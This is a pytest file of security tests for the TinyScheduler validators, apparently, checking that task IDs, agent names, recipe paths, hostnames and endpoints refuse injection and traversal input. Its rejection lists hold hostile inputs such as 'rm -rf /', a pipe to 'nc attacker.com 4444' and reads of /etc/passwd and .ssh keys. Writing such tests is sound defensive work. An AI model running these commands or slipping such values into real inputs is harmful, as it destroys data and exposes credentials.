"""
Security validation tests for TinyScheduler.

Tests for:
- CWE-78: OS Command Injection
- CWE-22: Path Traversal
- CWE-20: Improper Input Validation
"""

import pytest
from pathlib import Path
import tempfile
import os

from src.scheduler.validators import (
    validate_task_id,
    validate_agent_name,
    validate_recipe_path,
    validate_lease_path,
    validate_mcp_endpoint,
    validate_json_file_size,
    validate_hostname,
    validate_identifier,
)


class TestTaskIdValidation:
    """Test task_id validation against path traversal and injection."""
    
    def test_valid_task_ids(self):
        """Valid task IDs should pass validation."""
        valid_ids = [
            "task123",
            "task-456",
            "task_789",
            "abc-def_123",
            "TASK_ABC_123",
            "a",  # Single character
            "a" * 64,  # Maximum length
        ]
        for task_id in valid_ids:
            assert validate_task_id(task_id) == task_id
    
    def test_path_traversal_attempts(self):
        """Task IDs with path traversal should be rejected."""
        malicious_ids = [
            "../../../etc/passwd",
            "../../root/.ssh/authorized_keys",
            "..\\..\\windows\\system32",
            "../task",
            "task/../other",
            "task/../../etc/passwd",
        ]
        for task_id in malicious_ids:
            with pytest.raises(ValueError, match="Invalid task_id"):
                validate_task_id(task_id)
    
    def test_command_injection_attempts(self):
        """Task IDs with shell metacharacters should be rejected."""
        malicious_ids = [
            "task; rm -rf /",
            "task && malicious_command",
            "task | nc attacker.com 4444",
            "task`whoami`",
            "task$(whoami)",
            "task;ls",
            "task&echo",
            "task|cat",
        ]
        for task_id in malicious_ids:
            with pytest.raises(ValueError, match="Invalid task_id"):
                validate_task_id(task_id)
    
    def test_null_byte_injection(self):
        """Task IDs with null bytes should be rejected."""
        malicious_ids = [
            "task\x00",
            "task\x00.json",
            "\x00task",
        ]
        for task_id in malicious_ids:
            with pytest.raises(ValueError, match="Invalid task_id"):
                validate_task_id(task_id)
    
    def test_special_characters_rejected(self):
        """Task IDs with special characters should be rejected."""
        invalid_ids = [
            "task/id",
            "task\\id",
            "task.id",
            "task:id",
            "task*id",
            "task?id",
            "task#id",
            "task@id",
            "task!id",
            "task id",  # Space
            "task\tid",  # Tab
            "task\nid",  # Newline
        ]
        for task_id in invalid_ids:
            with pytest.raises(ValueError, match="Invalid task_id"):
                validate_task_id(task_id)
    
    def test_empty_task_id(self):
        """Empty task ID should be rejected."""
        with pytest.raises(ValueError, match="Empty task_id"):
            validate_task_id("")
    
    def test_too_long_task_id(self):
        """Task IDs exceeding maximum length should be rejected."""
        too_long = "a" * 65
        with pytest.raises(ValueError, match="too long"):
            validate_task_id(too_long)


class TestAgentNameValidation:
    """Test agent name validation."""
    
    def test_valid_agent_names(self):
        """Valid agent names should pass validation."""
        valid_names = [
            "vaela",
            "oscar",
            "dev-agent",
            "qa_agent",
            "agent123",
            "AGENT_01",
        ]
        for agent in valid_names:
            assert validate_agent_name(agent) == agent
    
    def test_invalid_agent_names(self):
        """Invalid agent names should be rejected."""
        invalid_names = [
            "../agent",
            "agent;ls",
            "agent && echo",
            "agent/path",
            "agent.name",
            "agent name",
        ]
        for agent in invalid_names:
            with pytest.raises(ValueError, match="Invalid agent"):
                validate_agent_name(agent)


class TestRecipePathValidation:
    """Test recipe path validation against path traversal."""
    
    def setup_method(self):
        """Set up temporary recipes directory."""
        self.temp_dir = tempfile.mkdtemp()
        self.recipes_dir = Path(self.temp_dir) / "recipes"
        self.recipes_dir.mkdir()
        
        # Create some valid recipe files
        (self.recipes_dir / "dev.yaml").touch()
        (self.recipes_dir / "qa.yml").touch()
        
        # Create subdirectory with recipe
        subdir = self.recipes_dir / "subdir"
        subdir.mkdir()
        (subdir / "nested.yaml").touch()
    
    def teardown_method(self):
        """Clean up temporary directory."""
        import shutil
        shutil.rmtree(self.temp_dir)
    
    def test_valid_recipe_paths(self):
        """Valid recipe paths should be accepted."""
        valid_recipes = [
            "dev.yaml",
            "qa.yml",
            "subdir/nested.yaml",
        ]
        for recipe in valid_recipes:
            result = validate_recipe_path(recipe, self.recipes_dir)
            assert result.is_absolute()
            assert result.parent == self.recipes_dir or result.parent.parent == self.recipes_dir
    
    def test_path_traversal_attempts(self):
        """Recipe paths with traversal should be rejected."""
        malicious_recipes = [
            "../../../etc/passwd",
            "../../root/.ssh/authorized_keys",
            "/etc/passwd",
            "subdir/../../etc/passwd",
            "../recipes/dev.yaml",
            "subdir/../../../etc/passwd",
        ]
        for recipe in malicious_recipes:
            with pytest.raises(ValueError, match="Invalid recipe|Parent directory|Absolute"):
                validate_recipe_path(recipe, self.recipes_dir)
    
    def test_absolute_paths_rejected(self):
        """Absolute recipe paths should be rejected."""
        with pytest.raises(ValueError, match="Absolute"):
            validate_recipe_path("/etc/passwd", self.recipes_dir)
    
    def test_invalid_extensions_rejected(self):
        """Recipe paths without .yaml/.yml extension should be rejected."""
        invalid_recipes = [
            "recipe.txt",
            "recipe.json",
            "recipe.sh",
            "recipe",
            "recipe.yaml.txt",
        ]
        for recipe in invalid_recipes:
            with pytest.raises(ValueError, match="must have .yaml or .yml extension"):
                validate_recipe_path(recipe, self.recipes_dir)
    
    def test_parent_directory_references(self):
        """Recipe paths with .. should be rejected."""
        with pytest.raises(ValueError, match="Parent directory"):
            validate_recipe_path("subdir/../dev.yaml", self.recipes_dir)


class TestLeasePathValidation:
    """Test lease path validation."""
    
    def setup_method(self):
        """Set up temporary lease directory."""
        self.temp_dir = tempfile.mkdtemp()
        self.lease_dir = Path(self.temp_dir) / "leases"
        self.lease_dir.mkdir()
    
    def teardown_method(self):
        """Clean up temporary directory."""
        import shutil
        shutil.rmtree(self.temp_dir)
    
    def test_valid_lease_paths(self):
        """Valid task IDs should produce valid lease paths."""
        valid_ids = ["task123", "task-456", "task_789"]
        for task_id in valid_ids:
            result = validate_lease_path(task_id, self.lease_dir)
            assert result.parent == self.lease_dir
            assert result.name == f"task_{task_id}.json"
    
    def test_path_traversal_rejected(self):
        """Lease paths with traversal attempts should be rejected."""
        malicious_ids = [
            "../../../etc/passwd",
            "../../task",
            "../task",
        ]
        for task_id in malicious_ids:
            with pytest.raises(ValueError):
                validate_lease_path(task_id, self.lease_dir)


class TestMCPEndpointValidation:
    """Test MCP endpoint URL validation."""
    
    def test_valid_http_endpoints(self):
        """Valid HTTP endpoints should be accepted."""
        valid_endpoints = [
            "http://localhost:3000",
            "https://api.example.com",
            "http://127.0.0.1:8080",
            "https://tinytask.internal:9000",
        ]
        for endpoint in valid_endpoints:
            assert validate_mcp_endpoint(endpoint) == endpoint
    
    def test_invalid_protocols_rejected(self):
        """Invalid protocols should be rejected."""
        invalid_endpoints = [
            "ftp://localhost:3000",
            "file:///etc/passwd",
            "gopher://example.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
        for endpoint in invalid_endpoints:
            with pytest.raises(ValueError, match="Invalid MCP endpoint protocol"):
                validate_mcp_endpoint(endpoint)
    
    def test_localhost_blocking(self):
        """Localhost should be blocked when allow_localhost=False."""
        localhost_endpoints = [
            "http://localhost:3000",
            "http://127.0.0.1:3000",
            "http://0.0.0.0:3000",
            "http://[::1]:3000",
        ]
        for endpoint in localhost_endpoints:
            with pytest.raises(ValueError, match="Localhost MCP endpoints not allowed"):
                validate_mcp_endpoint(endpoint, allow_localhost=False)


class TestJSONFileSizeValidation:
    """Test JSON file size validation."""
    
    def setup_method(self):
        """Set up temporary directory."""
        self.temp_dir = tempfile.mkdtemp()
    
    def teardown_method(self):
        """Clean up temporary directory."""
        import shutil
        shutil.rmtree(self.temp_dir)
    
    def test_small_file_accepted(self):
        """Small JSON files should be accepted."""
        small_file = Path(self.temp_dir) / "small.json"
        small_file.write_text('{"key": "value"}')
        
        # Should not raise
        validate_json_file_size(small_file, max_size_mb=10)
    
    def test_large_file_rejected(self):
        """Files exceeding size limit should be rejected."""
        large_file = Path(self.temp_dir) / "large.json"
        
        # Create a file larger than 1MB
        large_content = '{"key": "' + ('x' * 2 * 1024 * 1024) + '"}'
        large_file.write_text(large_content)
        
        with pytest.raises(ValueError, match="JSON file too large"):
            validate_json_file_size(large_file, max_size_mb=1)
    
    def test_nonexistent_file_raises(self):
        """Nonexistent files should raise FileNotFoundError."""
        nonexistent = Path(self.temp_dir) / "nonexistent.json"
        
        with pytest.raises(FileNotFoundError):
            validate_json_file_size(nonexistent)


class TestHostnameValidation:
    """Test hostname validation."""
    
    def test_valid_hostnames(self):
        """Valid hostnames should be accepted."""
        valid_hostnames = [
            "localhost",
            "myhost",
            "my-host",
            "host123",
            "host.example.com",
            "sub.domain.example.com",
        ]
        for hostname in valid_hostnames:
            assert validate_hostname(hostname) == hostname
    
    def test_invalid_hostnames_rejected(self):
        """Invalid hostnames should be rejected."""
        invalid_hostnames = [
            "host name",  # Space
            "host\nname",  # Newline
            "host;ls",  # Semicolon
            "host|ls",  # Pipe
            "host&ls",  # Ampersand
        ]
        for hostname in invalid_hostnames:
            with pytest.raises(ValueError, match="Invalid hostname"):
                validate_hostname(hostname)
    
    def test_empty_hostname_rejected(self):
        """Empty hostname should be rejected."""
        with pytest.raises(ValueError, match="Empty hostname"):
            validate_hostname("")
    
    def test_too_long_hostname_rejected(self):
        """Hostnames exceeding 253 characters should be rejected."""
        too_long = "a" * 254
        with pytest.raises(ValueError, match="Hostname too long"):
            validate_hostname(too_long)


class TestIdentifierValidation:
    """Test generic identifier validation."""
    
    def test_custom_max_length(self):
        """Custom max length should be enforced."""
        short_max = "a" * 10
        assert validate_identifier(short_max, "test", max_length=10) == short_max
        
        too_long = "a" * 11
        with pytest.raises(ValueError, match="too long"):
            validate_identifier(too_long, "test", max_length=10)
    
    def test_parameter_name_in_error(self):
        """Error messages should include parameter name."""
        with pytest.raises(ValueError, match="Invalid custom_param"):
            validate_identifier("invalid/chars", "custom_param")


class TestSecurityIntegration:
    """Integration tests simulating real attack scenarios."""
    
    def setup_method(self):
        """Set up temporary directories."""
        self.temp_dir = tempfile.mkdtemp()
        self.recipes_dir = Path(self.temp_dir) / "recipes"
        self.recipes_dir.mkdir()
        self.lease_dir = Path(self.temp_dir) / "leases"
        self.lease_dir.mkdir()
    
    def teardown_method(self):
        """Clean up temporary directory."""
        import shutil
        shutil.rmtree(self.temp_dir)
    
    def test_symlink_attack_prevention(self):
        """Symlink attacks should be prevented."""
        # Create a symlink pointing outside recipes_dir
        target = Path(self.temp_dir) / "secret.yaml"
        target.write_text("secret: data")
        
        symlink = self.recipes_dir / "symlink.yaml"
        try:
            symlink.symlink_to(target)
            
            # Validation should detect and reject the symlink pointing outside recipes_dir
            with pytest.raises(ValueError, match="Recipe path outside recipes directory"):
                validate_recipe_path("symlink.yaml", self.recipes_dir)
        except OSError:
            # Some systems don't support symlinks
            pytest.skip("Symlinks not supported on this system")
    
    def test_combined_validation_pipeline(self):
        """Test full validation pipeline as used in real code."""
        # Simulate scheduler validating all inputs before spawning
        task_id = "task-123"
        agent = "dev-agent"
        recipe = "dev.yaml"
        
        # All should pass
        validated_task_id = validate_task_id(task_id)
        validated_agent = validate_agent_name(agent)
        
        # Create recipe file
        (self.recipes_dir / recipe).touch()
        validated_recipe = validate_recipe_path(recipe, self.recipes_dir)
        
        assert validated_task_id == task_id
        assert validated_agent == agent
        assert validated_recipe.exists()
    
    def test_attack_chain_prevention(self):
        """Prevent attack chains combining multiple vectors."""
        # Attacker tries to use command injection in task_id to access files
        # via path traversal in recipe
        malicious_task = "task; cat ../../../etc/passwd"
        malicious_recipe = "../../../etc/passwd"
        
        # Both should be blocked
        with pytest.raises(ValueError):
            validate_task_id(malicious_task)
        
        with pytest.raises(ValueError):
            validate_recipe_path(malicious_recipe, self.recipes_dir)
